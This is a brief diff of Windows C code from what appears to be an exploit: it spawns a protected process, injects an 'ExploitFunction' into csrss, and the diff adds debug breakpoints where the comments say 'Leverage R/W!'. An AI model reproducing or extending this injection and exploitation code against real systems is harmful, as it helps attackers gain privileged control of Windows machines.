@@ -133,6 +133,7 @@ D_SEC( A ) VOID WINAPI Start( VOID )
 				if ( SpawnProtectedProcessLibrary( Dos, Len, &Pri ) ) {
 					if ( NT_SUCCESS( Api.NtWaitForSingleObject( Pri.hProcess, FALSE, NULL ) ) ) {
 						/* Leverage R/W! */
+						__debugbreak();
 					};
 					Api.NtClose( Pri.hThread );
 					Api.NtClose( Pri.hProcess );
@@ -141,6 +142,7 @@ D_SEC( A ) VOID WINAPI Start( VOID )
 				if ( InjectProcess( ( ( PTABLE ) G_PTR( Table ) )->CsrssId, C_PTR( G_PTR( ExploitFunction ) ), U_PTR( G_END() ) - U_PTR( G_PTR( ExploitFunction ) ), &Th1 ) ) {
 					if ( NT_SUCCESS( Api.NtWaitForSingleObject( Th1, FALSE, NULL ) ) ) {
 						/* Leverage R/W! */
+						__debugbreak();
 					};
 					Api.NtClose( Th1 );
 				};
